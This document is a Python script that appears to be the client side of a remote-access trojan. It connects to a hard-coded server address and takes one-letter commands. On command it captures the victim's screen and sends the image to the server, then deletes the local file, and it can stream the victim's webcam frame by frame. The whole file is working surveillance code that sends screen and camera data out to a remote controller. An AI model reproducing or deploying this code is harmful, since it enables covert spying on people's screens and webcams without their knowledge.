#!/usr/bin/env python3
import socket 
import os 
import sys
import time
import pyscreenshot
import tempfile
import cv2
import pickle

sock = socket.socket()
host = '192.168.0.106'
port = 8080
filepath = tempfile.gettempdir() + "/temp_screen.png"

def connect():
    try:
        sock.connect((host,port))
        print("Connected to server " + host)
    except:
        print("Failed connecting to server!...")
        sys.exit()

def ControlCenter():
    cmd = sock.recv(1024).decode()
    
    if cmd == "S" or cmd == "s":
        take_screenshot()
    elif cmd == "R" or cmd == "r":
        share_screen()
    elif cmd == "W" or cmd == "w":
        capture_webcam()
    else:
        print("Server closed - Exiting...")
        sock.close()
        sys.exit()
    
    ControlCenter()

def share_screen():
    print("share screen")

def capture_webcam():
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)

    H, W = 640, 480 #height & width set for capture
    
    #check for availability
    if not cap.isOpened():
        sock.send("OFF".encode())
        return
    sock.send("ON".encode()) 
    
    while True:
        ret, frame = cap.read()
        if not ret:
            break

        frame = cv2.resize(frame, (H, W))
        #print(frame)

        while True:
            data = sock.recv(1024).decode() #get operation needed

            if data == "GET":
                sock.send("OK".encode())
            elif data == "GET SIZE":
                sock.send(("SIZE " + str(len(pickle.dumps(frame)))).encode())
            elif data == "GET STREAM":
                sock.sendall(pickle.dumps(frame))      
            elif data == "GOT":
                break
            elif data == "EXIT":
                cap.release()
                return
                    
    cap.release()
   
def take_screenshot():
    #Capture screen
    img = pyscreenshot.grab()
    img.save(filepath)
   
    #Send file to server
    filesize = os.path.getsize(filepath)
    sock.send(str(filesize).encode('utf-8'))
    
    with open(filepath ,'rb') as f:
        bytesToSend = f.read(1024)
        sock.send(bytesToSend)
        while bytesToSend != "":
            bytesToSend = f.read(1024)
            sock.send(bytesToSend)
            status = sock.recv(1024)
            if status == "Download Finished!".encode('utf-8'):
                break
    
    #File was sent
    os.remove(filepath) #delete temporary file

if __name__ == '__main__':
    connect()
    ControlCenter()
